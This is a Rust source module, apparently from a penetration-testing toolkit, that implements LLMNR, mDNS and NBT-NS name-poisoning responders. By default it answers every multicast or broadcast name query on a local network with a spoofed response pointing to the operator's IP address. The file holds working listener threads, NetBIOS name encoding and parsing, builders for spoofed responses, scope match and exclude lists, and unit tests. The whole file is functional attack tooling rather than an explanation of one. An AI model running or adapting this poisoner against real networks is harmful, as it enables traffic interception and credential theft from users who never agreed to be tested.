// name_poison — llmnr / mdns / nbt-ns responders.
//
// default-permissive: answer every name query we receive (responder's
// classic behavior). with an explicit match_list, only answer listed
// names. exclude_list always wins.
//
// all three listeners run on their own threads, emit pentestevents
// through a shared mpsc sender, and exit when the stop flag flips.
//
// responses go back unicast to the source address — never back to the
// multicast group (that'd flood the network and light up every host).

use anyhow::Result;
use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4, UdpSocket};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Arc};
use std::time::Duration;

use socket2::{Domain, Protocol, Socket, Type};

use crate::attacks::dns_spoof;
use crate::events::{EventKind, PentestEvent};

pub const LLMNR_MCAST: Ipv4Addr = Ipv4Addr::new(224, 0, 0, 252);
pub const LLMNR_PORT: u16 = 5355;
pub const MDNS_MCAST: Ipv4Addr = Ipv4Addr::new(224, 0, 0, 251);
pub const MDNS_PORT: u16 = 5353;
pub const NBT_NS_PORT: u16 = 137;

#[derive(Debug, Clone)]
pub struct NamePoisonConfig {
    pub our_ip: Ipv4Addr,
    pub iface_ip: Ipv4Addr,
    // if non-empty, only answer names matching these patterns (wildcard ok).
    // if empty, answer all (except excluded).
    pub match_list: Vec<String>,
    // never answer these names (wins over match_list).
    pub exclude_list: Vec<String>,
}

impl NamePoisonConfig {
    pub fn should_answer(&self, name: &str) -> bool {
        let lower = name.to_ascii_lowercase();
        for excl in &self.exclude_list {
            if wildcard_match(excl, &lower) {
                return false;
            }
        }
        if self.match_list.is_empty() {
            return true;
        }
        self.match_list.iter().any(|m| wildcard_match(m, &lower))
    }
}

// "*" matches anything; "*.foo" matches any subdomain of foo; otherwise exact.
// both sides are normalized to lowercase so callers need not pre-lowercase.
fn wildcard_match(pattern: &str, name: &str) -> bool {
    let p = pattern.to_ascii_lowercase();
    let n = name.to_ascii_lowercase();
    if p == "*" {
        return true;
    }
    if let Some(rest) = p.strip_prefix("*.") {
        return n.ends_with(&format!(".{}", rest)) || n == rest;
    }
    p == n
}

// ─── sockets ──────────────────────────────────────────────────────────────

fn build_multicast_socket(port: u16, mcast: Ipv4Addr, iface_ip: Ipv4Addr) -> Result<UdpSocket> {
    let sock = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
    sock.set_reuse_address(true)?;
    let bind_addr = SocketAddr::V4(SocketAddrV4::new(Ipv4Addr::UNSPECIFIED, port));
    sock.bind(&bind_addr.into())?;
    sock.join_multicast_v4(&mcast, &iface_ip)?;
    sock.set_multicast_loop_v4(false)?;
    let std_sock: UdpSocket = sock.into();
    std_sock.set_read_timeout(Some(Duration::from_millis(200)))?;
    Ok(std_sock)
}

fn build_broadcast_socket(port: u16) -> Result<UdpSocket> {
    let sock = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
    sock.set_reuse_address(true)?;
    sock.set_broadcast(true)?;
    let bind_addr = SocketAddr::V4(SocketAddrV4::new(Ipv4Addr::UNSPECIFIED, port));
    sock.bind(&bind_addr.into())?;
    let std_sock: UdpSocket = sock.into();
    std_sock.set_read_timeout(Some(Duration::from_millis(200)))?;
    Ok(std_sock)
}

// ─── llmnr (rfc 4795) ─────────────────────────────────────────────────────

pub fn run_llmnr_listener(
    cfg: NamePoisonConfig,
    event_tx: mpsc::Sender<PentestEvent>,
    stop: Arc<AtomicBool>,
) -> Result<()> {
    let sock = build_multicast_socket(LLMNR_PORT, LLMNR_MCAST, cfg.iface_ip)?;
    run_dns_format_listener(&sock, "llmnr", cfg, event_tx, stop)
}

// ─── mdns (rfc 6762) ──────────────────────────────────────────────────────

pub fn run_mdns_listener(
    cfg: NamePoisonConfig,
    event_tx: mpsc::Sender<PentestEvent>,
    stop: Arc<AtomicBool>,
) -> Result<()> {
    let sock = build_multicast_socket(MDNS_PORT, MDNS_MCAST, cfg.iface_ip)?;
    run_dns_format_listener(&sock, "mdns", cfg, event_tx, stop)
}

// llmnr and mdns use identical dns-format wire layout — one handler fits both
fn run_dns_format_listener(
    sock: &UdpSocket,
    protocol: &'static str,
    cfg: NamePoisonConfig,
    event_tx: mpsc::Sender<PentestEvent>,
    stop: Arc<AtomicBool>,
) -> Result<()> {
    let mut buf = [0u8; 1500];
    while !stop.load(Ordering::Relaxed) {
        match sock.recv_from(&mut buf) {
            Ok((n, SocketAddr::V4(src))) => {
                let query = &buf[..n];
                let name = match dns_spoof::extract_query_name(query) {
                    Some(n) => n,
                    None => continue, // not a query or malformed
                };
                let _ = event_tx.send(PentestEvent::new(EventKind::NameQuery {
                    protocol,
                    name: name.clone(),
                    src: *src.ip(),
                }));
                if !cfg.should_answer(&name) {
                    continue;
                }
                let resp = match dns_spoof::build_spoofed_response(query, cfg.our_ip) {
                    Some(r) => r,
                    None => continue,
                };
                let _ = sock.send_to(&resp, src);
                let _ = event_tx.send(PentestEvent::new(EventKind::NamePoisoned {
                    protocol,
                    name,
                    spoof_ip: cfg.our_ip,
                    src: *src.ip(),
                }));
            }
            Ok(_) => continue, // ipv6 src — skip
            Err(e) if is_timeout(&e) => continue,
            Err(e) => {
                log::debug!("{} recv err: {}", protocol, e);
                continue;
            }
        }
    }
    Ok(())
}

fn is_timeout(e: &std::io::Error) -> bool {
    matches!(
        e.kind(),
        std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut
    )
}

// ─── nbt-ns (rfc 1002) ────────────────────────────────────────────────────

pub fn run_nbt_ns_listener(
    cfg: NamePoisonConfig,
    event_tx: mpsc::Sender<PentestEvent>,
    stop: Arc<AtomicBool>,
) -> Result<()> {
    let sock = build_broadcast_socket(NBT_NS_PORT)?;
    let mut buf = [0u8; 1500];
    while !stop.load(Ordering::Relaxed) {
        match sock.recv_from(&mut buf) {
            Ok((n, SocketAddr::V4(src))) => {
                let query = &buf[..n];
                let parsed = match parse_nbt_ns_query(query) {
                    Some(q) => q,
                    None => continue,
                };
                let display_name = display_nbt_name(&parsed.decoded_name, parsed.name_type);
                let _ = event_tx.send(PentestEvent::new(EventKind::NameQuery {
                    protocol: "nbt-ns",
                    name: display_name.clone(),
                    src: *src.ip(),
                }));
                if !cfg.should_answer(&display_name) {
                    continue;
                }
                let resp = build_nbt_ns_response(query, parsed, cfg.our_ip);
                let _ = sock.send_to(&resp, src);
                let _ = event_tx.send(PentestEvent::new(EventKind::NamePoisoned {
                    protocol: "nbt-ns",
                    name: display_name,
                    spoof_ip: cfg.our_ip,
                    src: *src.ip(),
                }));
            }
            Ok(_) => continue,
            Err(e) if is_timeout(&e) => continue,
            Err(e) => {
                log::debug!("nbt-ns recv err: {}", e);
                continue;
            }
        }
    }
    Ok(())
}

// ─── nbt-ns wire format ───────────────────────────────────────────────────

// "first-level encoding": each byte → 2 ASCII chars via nibble + 'A'.
// input: 16 bytes. output: 32 chars.
#[allow(dead_code)] // symmetric pair with decode_nbt_name; used by tests + future encoders
pub fn encode_nbt_name(name_16: &[u8; 16]) -> [u8; 32] {
    let mut out = [0u8; 32];
    for (i, b) in name_16.iter().enumerate() {
        let hi = (b >> 4) & 0x0f;
        let lo = b & 0x0f;
        out[i * 2] = b'A' + hi;
        out[i * 2 + 1] = b'A' + lo;
    }
    out
}

// decode 32 ASCII chars back to 16 bytes. returns None on non-A..P chars.
pub fn decode_nbt_name(encoded: &[u8; 32]) -> Option<[u8; 16]> {
    let mut out = [0u8; 16];
    for i in 0..16 {
        let hi = encoded[i * 2].checked_sub(b'A')?;
        let lo = encoded[i * 2 + 1].checked_sub(b'A')?;
        if hi > 0x0f || lo > 0x0f {
            return None;
        }
        out[i] = (hi << 4) | lo;
    }
    Some(out)
}

#[derive(Debug, Clone)]
struct NbtNsQuery {
    txid: [u8; 2],
    // 15 trimmed name bytes + 1 type byte = the 16-byte netbios name
    decoded_name: [u8; 15],
    name_type: u8,
    // byte slice from start of nbt-ns question name for echoing back
    name_offset_in_query: usize,
    name_section_len: usize,
}

fn parse_nbt_ns_query(data: &[u8]) -> Option<NbtNsQuery> {
    if data.len() < 12 + 1 + 32 + 1 + 4 {
        return None;
    }
    let txid = [data[0], data[1]];
    let flags = u16::from_be_bytes([data[2], data[3]]);
    // must be a query (qr=0)
    if flags & 0x8000 != 0 {
        return None;
    }
    let qdcount = u16::from_be_bytes([data[4], data[5]]);
    if qdcount == 0 {
        return None;
    }
    // question section starts at 12.
    // name: 1-byte length (should be 0x20=32) + 32 encoded chars + null
    let name_off = 12;
    if data[name_off] != 0x20 {
        return None;
    }
    let encoded: &[u8; 32] = data[name_off + 1..name_off + 33].try_into().ok()?;
    if data[name_off + 33] != 0x00 {
        return None;
    }
    let decoded = decode_nbt_name(encoded)?;
    // 16-byte netbios name: first 15 bytes are the (space-padded) name,
    // last byte is the type code
    let mut name_15 = [0u8; 15];
    name_15.copy_from_slice(&decoded[..15]);
    let name_type = decoded[15];

    Some(NbtNsQuery {
        txid,
        decoded_name: name_15,
        name_type,
        name_offset_in_query: name_off,
        name_section_len: 34, // 1 + 32 + 1
    })
}

fn build_nbt_ns_response(
    query: &[u8],
    parsed: NbtNsQuery,
    spoof_ip: Ipv4Addr,
) -> Vec<u8> {
    // header
    let mut resp = Vec::with_capacity(query.len() + 16);
    resp.extend_from_slice(&parsed.txid);
    // flags: response (qr=1), opcode=query(0), aa=1, tc=0, rd=1, ra=1, nm_flags, rcode=0
    // bit layout: 0x8500 covers qr|aa|rd in the high byte, then ra|rcode=0 in low.
    // use 0x8500 (qr + aa + rd) + 0x0080 (ra) = 0x8580
    resp.extend_from_slice(&0x8580u16.to_be_bytes());
    resp.extend_from_slice(&0u16.to_be_bytes()); // qdcount
    resp.extend_from_slice(&1u16.to_be_bytes()); // ancount
    resp.extend_from_slice(&0u16.to_be_bytes()); // nscount
    resp.extend_from_slice(&0u16.to_be_bytes()); // arcount

    // answer: echo encoded name back
    let name_end = parsed.name_offset_in_query + parsed.name_section_len;
    resp.extend_from_slice(&query[parsed.name_offset_in_query..name_end]);
    // type NB = 0x0020
    resp.extend_from_slice(&0x0020u16.to_be_bytes());
    // class IN = 0x0001
    resp.extend_from_slice(&0x0001u16.to_be_bytes());
    // ttl 165 (seconds) — responder uses similar
    resp.extend_from_slice(&165u32.to_be_bytes());
    // rdlength 6
    resp.extend_from_slice(&6u16.to_be_bytes());
    // rdata: nb_flags (0x0000 = b-node, unique) + ipv4
    resp.extend_from_slice(&0x0000u16.to_be_bytes());
    resp.extend_from_slice(&spoof_ip.octets());

    resp
}

// trim trailing 0x20 (space) padding; append type code as "<XX>" marker
fn display_nbt_name(name_15: &[u8; 15], name_type: u8) -> String {
    let trimmed: Vec<u8> = name_15
        .iter()
        .copied()
        .take_while(|b| *b != 0x20 && *b != 0x00)
        .collect();
    let s = String::from_utf8_lossy(&trimmed);
    format!("{}<{:02x}>", s, name_type)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wildcard_match_exact() {
        assert!(wildcard_match("foo", "foo"));
        assert!(!wildcard_match("foo", "bar"));
    }

    #[test]
    fn test_wildcard_match_star_matches_all() {
        assert!(wildcard_match("*", "anything"));
        assert!(wildcard_match("*", ""));
    }

    #[test]
    fn test_wildcard_match_star_prefix() {
        assert!(wildcard_match("*.corp", "a.corp"));
        assert!(wildcard_match("*.corp", "deep.sub.corp"));
        assert!(wildcard_match("*.corp", "corp")); // matches the bare domain too
        assert!(!wildcard_match("*.corp", "corp.com"));
    }

    #[test]
    fn test_wildcard_match_case_insensitive() {
        assert!(wildcard_match("Foo", "FOO"));
        assert!(wildcard_match("*.Corp", "A.CORP"));
    }

    #[test]
    fn test_should_answer_empty_list_matches_all() {
        let cfg = NamePoisonConfig {
            our_ip: Ipv4Addr::LOCALHOST,
            iface_ip: Ipv4Addr::LOCALHOST,
            match_list: vec![],
            exclude_list: vec![],
        };
        assert!(cfg.should_answer("wpad"));
        assert!(cfg.should_answer("anything"));
    }

    #[test]
    fn test_should_answer_match_list_only() {
        let cfg = NamePoisonConfig {
            our_ip: Ipv4Addr::LOCALHOST,
            iface_ip: Ipv4Addr::LOCALHOST,
            match_list: vec!["wpad".into(), "*.corp".into()],
            exclude_list: vec![],
        };
        assert!(cfg.should_answer("wpad"));
        assert!(cfg.should_answer("intranet.corp"));
        assert!(!cfg.should_answer("google.com"));
    }

    #[test]
    fn test_should_answer_exclude_beats_match() {
        let cfg = NamePoisonConfig {
            our_ip: Ipv4Addr::LOCALHOST,
            iface_ip: Ipv4Addr::LOCALHOST,
            match_list: vec!["*".into()],
            exclude_list: vec!["dc01.corp".into(), "*.safe".into()],
        };
        assert!(cfg.should_answer("anything.else"));
        assert!(!cfg.should_answer("dc01.corp"));
        assert!(!cfg.should_answer("printer.safe"));
    }

    #[test]
    fn test_encode_nbt_name_foo() {
        // "FOO" space-padded, type 0x20 (workstation) at byte 15
        let mut name = [0x20u8; 16]; // all spaces
        name[0] = b'F';
        name[1] = b'O';
        name[2] = b'O';
        name[15] = 0x20; // type byte (server)
        let encoded = encode_nbt_name(&name);
        // F=0x46 → "EG", O=0x4f → "EP", O → "EP", space=0x20 → "CA"x12, type=0x20 → "CA"
        assert_eq!(&encoded[0..2], b"EG");
        assert_eq!(&encoded[2..4], b"EP");
        assert_eq!(&encoded[4..6], b"EP");
        for i in 3..16 {
            assert_eq!(&encoded[i * 2..i * 2 + 2], b"CA");
        }
    }

    #[test]
    fn test_encode_decode_nbt_name_roundtrip() {
        let mut name = [0x20u8; 16];
        name[0] = b'W';
        name[1] = b'K';
        name[2] = b'S';
        name[15] = 0x00;
        let encoded = encode_nbt_name(&name);
        let decoded = decode_nbt_name(&encoded).unwrap();
        assert_eq!(decoded, name);
    }

    #[test]
    fn test_decode_nbt_name_rejects_bad_chars() {
        let mut encoded = [b'A'; 32];
        encoded[0] = b'Z'; // Z = A+25 → outside 0..=0x0f
        assert!(decode_nbt_name(&encoded).is_none());
    }

    fn build_nbt_query_bytes(name_15: &[u8; 15], name_type: u8) -> Vec<u8> {
        // header
        let mut v = Vec::new();
        v.extend_from_slice(&[0xab, 0xcd]); // txid
        v.extend_from_slice(&0x0110u16.to_be_bytes()); // flags: query + broadcast
        v.extend_from_slice(&1u16.to_be_bytes()); // qdcount
        v.extend_from_slice(&[0, 0, 0, 0, 0, 0]); // an/ns/ar counts
        // question name: 0x20 + 32 encoded + 0x00
        v.push(0x20);
        let mut full = [0x20u8; 16];
        full[..15].copy_from_slice(name_15);
        full[15] = name_type;
        v.extend_from_slice(&encode_nbt_name(&full));
        v.push(0x00);
        // qtype NB + qclass IN
        v.extend_from_slice(&0x0020u16.to_be_bytes());
        v.extend_from_slice(&0x0001u16.to_be_bytes());
        v
    }

    #[test]
    fn test_parse_nbt_ns_query() {
        let mut name = [0x20u8; 15];
        name[0] = b'W';
        name[1] = b'P';
        name[2] = b'A';
        name[3] = b'D';
        let q = build_nbt_query_bytes(&name, 0x00);
        let parsed = parse_nbt_ns_query(&q).unwrap();
        assert_eq!(parsed.decoded_name, name);
        assert_eq!(parsed.name_type, 0x00);
    }

    #[test]
    fn test_parse_nbt_ns_query_rejects_response() {
        let mut name = [0x20u8; 15];
        name[0] = b'X';
        let mut q = build_nbt_query_bytes(&name, 0x00);
        q[2] |= 0x80; // set qr bit
        assert!(parse_nbt_ns_query(&q).is_none());
    }

    #[test]
    fn test_build_nbt_ns_response_shape() {
        let mut name = [0x20u8; 15];
        name[0] = b'W';
        name[1] = b'P';
        name[2] = b'A';
        name[3] = b'D';
        let q = build_nbt_query_bytes(&name, 0x00);
        let parsed = parse_nbt_ns_query(&q).unwrap();
        let resp = build_nbt_ns_response(&q, parsed, Ipv4Addr::new(10, 0, 0, 5));

        // header
        assert_eq!(&resp[0..2], &[0xab, 0xcd]); // txid preserved
        assert_eq!(u16::from_be_bytes([resp[2], resp[3]]), 0x8580); // flags
        assert_eq!(u16::from_be_bytes([resp[4], resp[5]]), 0); // qdcount
        assert_eq!(u16::from_be_bytes([resp[6], resp[7]]), 1); // ancount

        // last 4 bytes = spoof ip
        let ip_bytes = &resp[resp.len() - 4..];
        assert_eq!(ip_bytes, &[10, 0, 0, 5]);
    }

    // all-space name: happens when query is for the wildcard. display
    // should render an empty-ish name with just the type tag.
    #[test]
    fn test_display_nbt_name_all_spaces() {
        let name = [0x20u8; 15];
        assert_eq!(display_nbt_name(&name, 0x1b), "<1b>");
    }

    // null bytes mid-name: some exotic netbios clients. trim at first null.
    #[test]
    fn test_display_nbt_name_null_terminator() {
        let mut name = [0x20u8; 15];
        name[0] = b'A';
        name[1] = b'B';
        name[2] = 0x00; // null before spaces
        name[3] = b'X'; // should not appear
        assert_eq!(display_nbt_name(&name, 0x00), "AB<00>");
    }

    // full round trip: every byte value 0x00..=0xff encodes and decodes
    // back to the original. guards against nibble-math regressions.
    #[test]
    fn test_encode_decode_all_byte_values() {
        for i in 0u16..=255 {
            let mut name = [0u8; 16];
            name[0] = i as u8;
            let enc = encode_nbt_name(&name);
            let dec = decode_nbt_name(&enc).expect("roundtrip should succeed");
            assert_eq!(dec, name, "byte {:#04x} failed to roundtrip", i);
        }
    }

    // nbt query with broken length byte (not 0x20) rejected
    #[test]
    fn test_parse_nbt_ns_query_rejects_bad_length_prefix() {
        let mut name = [0x20u8; 15];
        name[0] = b'X';
        let mut q = build_nbt_query_bytes(&name, 0x00);
        q[12] = 0x10; // wrong length byte (should be 0x20)
        assert!(parse_nbt_ns_query(&q).is_none());
    }

    #[test]
    fn test_display_nbt_name_trims_padding() {
        let mut name = [0x20u8; 15];
        name[0] = b'W';
        name[1] = b'P';
        name[2] = b'A';
        name[3] = b'D';
        assert_eq!(display_nbt_name(&name, 0x00), "WPAD<00>");

        let mut name2 = [0x20u8; 15];
        name2[0] = b'H';
        name2[1] = b'O';
        name2[2] = b'S';
        name2[3] = b'T';
        assert_eq!(display_nbt_name(&name2, 0x20), "HOST<20>");
    }
}
